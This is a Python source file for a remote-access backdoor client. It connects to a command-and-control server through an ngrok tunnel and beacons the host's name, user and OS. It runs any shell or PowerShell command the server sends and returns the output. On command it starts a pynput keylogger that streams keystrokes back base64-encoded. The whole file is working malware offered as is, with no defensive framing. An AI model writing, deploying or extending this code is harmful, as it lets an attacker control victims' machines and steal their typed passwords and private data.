"""
design@asij

"""

import getpass
import os
import socket
import platform
import time
import threading
import subprocess
import base64
import pynput
from pynput import keyboard

# If the free version of ngrok is used, the port will change each time ngrok is activated
address = "0.tcp.jp.ngrok.io" # address
port = 18642 # port 
glbSock = None # Stores the sock 

keyBuffer = "" # String to store keystrokes for keylogging
loggerIsRunning = False # Stores whether the keylogger is working


# Handles the connection of the client to the C2 server through the socket library and tcp server. 
# Preconditions: Valid address and socket, ngrok tcp port is open
# Postconditions: Machine is connected to the C2 server, handler thread is wokring, the machine sends its information via send_beacon
def connect_client():
  global glbSock
  # Infinite loop to keep trying to connect to the server
  while True:
    try:
      # Creates a socket object as clientSocket
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSocket:
        # Connect to server
        clientSocket.connect((address, port))
        send_beacon(clientSocket) # Send beacon to server to indicate that client is alive
        clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))
        glbSock = clientSocket
        handler = threading.Thread(target = command_handler, args=(glbSock,), daemon = True)
        handler.start()
        handler.join()
    except Exception as e:
      print(f'[*] Connection failed: {e}. Trying in 10 seconds...')
      # Delay for 10 sec
      time.sleep(10)

# Sends the current information of the machine to the listener/user. 
# Precondtions: Valid socket
# Postconditions: output is encoded into bytes and sent through the socket
def send_beacon(sock):
  beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
  sock.send(beacon.encode("utf-8"))

###
### Keylogger functions
###

# Helper for pynput keylogging, writes the keystrokes to a file in the current working directory of the user.
# Handles AttributeError by writing "SP: "
# This function is called to store the keystrokes in a string, then sends it back to the user every 100
# characters. After sending, the keyBuffer is cleared for the next 100 characters.
def on_press(key):
    global keyBuffer, glbSock, loggerIsRunning
    
    # Stops the logger and resets for next time
    if not loggerIsRunning:
      keyBuffer = ""
      return
    
    try:
      keyBuffer += key.char
    except AttributeError:
      keyBuffer += f" [SP: {key}] "

    if len(keyBuffer) >= 100 and glbSock is not None: # Send keystrokes every 100 characters
      try:
        encoded = base64.b64encode(keyBuffer.encode("utf-8")).decode("utf-8")
        glbSock.send(f"KEYLOG|{encoded}".encode("utf-8"))
        # Clear keyBuffer after sending
        keyBuffer = ""
      except:
        keyBuffer = ""

# Activates the keylogger while storing the sock as global sock. 
def start_keylogger(sock):
  #updates sock again before using on_press && loggerIsRunning is set to True
  global glbSock, loggerIsRunning
  glbSock= sock
  loggerIsRunning = True

  #Starts on_press
  with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
###
### Shell command function
###

# Executes the command based off of the command that is decoded and sends it back through the specified socket by looking through whether
# the command is a cd command, which goes through a different process due to possible child process change. Other terminal commands will 
# go through the same process (differentiating between mac and windows). After, the output is then encoded into bytes from string, then into 
# base 64 for reliability.
# Preconditions: The command input requires a decoded command (non empty string) and sock, socket is valid
# Postconditions: The command is executed and the output is sent back to the user 
def execute_command(command, sock):
    try:
    
      # Special handling for "cd" command
      if command.startswith("cd "):
        try:
          os.chdir(command[3:].strip())
          result = f"[{os.getcwd()}]"
        except Exception as e:
          result = f"Error changing directory: {e}"
      
      # Normal shell commands (whoami, hostname, ipconfig, dir, etc.)
      else:
        if os.name == "nt":
          result_obj = subprocess.run(["powershell", "-Command", command], 
                                        capture_output=True, timeout=15, text=True)
        else:
          result_obj = subprocess.run(command, shell=True, capture_output=True, timeout=15, text=True)
        
        result = result_obj.stdout + result_obj.stderr
        if not result.strip():
          result = "(No output)"

      # Send output back to listener
      encoded = base64.b64encode(result.encode("utf-8")).decode("utf-8")
      sock.send(f"CMD_RES|{encoded}".encode("utf-8"))
      print(f"[+] Executed: {command}")

    except subprocess.TimeoutExpired:
      sock.send(b"CMD_ERR|Command timed out")
    except Exception as e:
      sock.send(f"CMD_ERR|Error: {str(e)}".encode("utf-8"))


###
### Command Handler
###

# Handles the command that is received by the user/listener. Using data to collect the input of the user, this function handles the 
# tranasition between the user and the function execute)command) through reformatting of the input. If there is an error, it
# prints it.
# Preconditions: Valid specified socket, libraries correctly imported
# Postconditions: execute_command is functioning or the print statement is printed
def command_handler(sock):
  global loggerIsRunning
  while True:
    try:
      data = sock.recv(4096)

      # When no inut
      if not data: break
      
      cmd = data.decode("utf-8", errors="ignore").strip()
      
      
      # Keylogging command
      # Approach: Create a string that logs all the keystrokes, then send the string back to the user periodically.
      if cmd.startswith("KEYLOG_START"):
        keylog_thread = threading.Thread(target=start_keylogger, args = (sock,),daemon=True)
        keylog_thread.start()
        sock.send("KEYLOG| STARTED")
      elif cmd == "KEYLOG_STOP":
        loggerIsRunning = False
        sock.send("KEYLOG| STOPPED")

      #Other functions to be implemented
      

      # Shell Command
      else:
        execute_command(cmd, sock)

      # Error Handling
    except Exception as e:
      print(f'[*] Error receiving data: {e}')
      break





if __name__ == "__main__":
  connect_client()
